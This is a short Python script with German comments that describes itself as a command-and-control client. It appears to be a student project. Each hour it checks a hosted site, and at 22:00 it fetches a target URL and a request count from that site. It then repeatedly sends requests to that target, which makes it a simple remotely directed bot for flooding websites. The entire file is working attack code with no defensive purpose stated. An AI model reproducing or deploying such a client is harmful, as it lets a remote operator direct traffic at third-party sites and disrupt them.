import requests
import time
# command and controll website
url = "https://infofacharbeit.000webhostapp.com/"
def start():
    #ruft informationen der Website ab
    req = requests.get(url)
    #betritt die Bedingung, wenn die website mit "ok" antwortet
    if req.status_code == 200:
        #source code
        source = req.text
        #Ziel Url
        attack_url = source[1:]
        #t = anzahl der zugriffe
        t = int(source[0])
        for i in range(0,t,1):
            print(requests.get(attack_url).text)  

while True:
    #ruft die aktuelle zeit ab
    current_time = time.localtime()
    hours = current_time.tm_hour
    #1x am tag wird start abgerufen
    if hours == 22:
        start()
    time.sleep(3600)